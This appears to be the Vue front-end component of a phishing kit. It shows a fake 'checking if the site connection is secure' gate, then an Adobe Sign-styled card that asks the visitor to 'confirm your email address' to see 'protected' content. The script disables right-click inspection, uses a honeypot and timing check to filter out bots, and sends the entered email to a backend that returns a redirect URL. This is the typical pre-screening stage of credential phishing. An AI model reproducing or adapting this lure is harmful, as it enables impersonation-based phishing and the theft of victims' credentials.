<template>
  <div v-if="!captchaToken" class="gate-container">
    <main>
      <div class="instructions">
        <p>Please stand by while we are checking if the site connection is secure.</p>
        <div
          class="cf-turnstile"
          data-sitekey="0x4AAAAAABgei6QZruCN7n08"
        ></div>
      </div>
    </main>
  </div>

  <div v-else class="background">
    <div class="adobe-sign-container">
      <div class="sign-card">
        <div class="header">
          <div class="logo-text">
            <span class="success-check">⼈</span>
            <span>Before we continue...</span>
          </div>
        </div>
        <div class="content">
          <p><strong>This content is protected, please confirm your email address.</strong></p>
          <div class="form-wrapper">
            <label for="honeypot" class="visually-hidden">Do not fill this field (anti-bot)</label>
            <input
              id="honeypot"
              v-model="honeypot"
              type="text"
              style="display: none;"
              tabindex="-1"
              autocomplete="off"
              aria-hidden="true"
            />
            <label for="email" class="visually-hidden">Email address</label>
            <input
              id="email"
              v-model="email"
              type="email"
              placeholder="Enter email"
              required
              class="email-input"
              :disabled="loading"
            />
            <p v-if="error" class="error" role="alert" aria-live="polite">{{ error }}</p>
            <button
              @click="submitForm"
              :disabled="loading"
              class="action-button"
            >
              {{ loading ? 'Verifying…' : 'CONTINUE' }}
            </button>
          </div>
        </div>
        <div class="divider"></div>
        <div class="footer-container">
          <p class="footer-text">© 2025 All rights reserved.</p>
        </div>
      </div>
    </div>
  </div>
</template>

<script setup>
import { ref, onMounted, nextTick } from 'vue'
const email = ref('')
const honeypot = ref('')
const error = ref('')
const loading = ref(false)
const captchaToken = ref(null)
const pageLoadTime = Date.now()

onMounted(() => {
  document.addEventListener('contextmenu', e => e.preventDefault())
})

onMounted(async () => {
  await nextTick()
  if (window.turnstile) {
    window.turnstile.render('.cf-turnstile', {
      sitekey: '0x4AAAAAABgei6QZruCN7n08',
      callback: (token) => {
        captchaToken.value = token
      }
    })
  }
})

function isValidEmail(e) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e)
}

async function submitForm() {
  if (!email.value.trim()) {
    error.value = 'Please enter your email.'
    return
  }
  if (!isValidEmail(email.value)) {
    error.value = 'Invalid email format.'
    return
  }

  const timeSinceLoad = Date.now() - pageLoadTime
  if (timeSinceLoad < 2000) {
    error.value = 'Too fast. Please try again.'
    return
  }

  if (honeypot.value) {
    error.value = 'Bot-like activity detected.'
    return
  }

  error.value = ''
  loading.value = true

  try {
    const res = await fetch(`${import.meta.env.VITE_API_BASE}/api/check-email`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email: email.value,
        captchaToken: captchaToken.value,
        middleName: honeypot.value,
        clientTimestamp: pageLoadTime
      })
    })

    const data = await res.json()
    if (!res.ok || !data.valid) {
      throw new Error(data.message || 'Verification failed')
    }
    if (data.redirectUrl) {
      window.location.href = data.redirectUrl
    }
  } catch (err) {
    error.value = err.message
  } finally {
    loading.value = false
  }
}
</script>
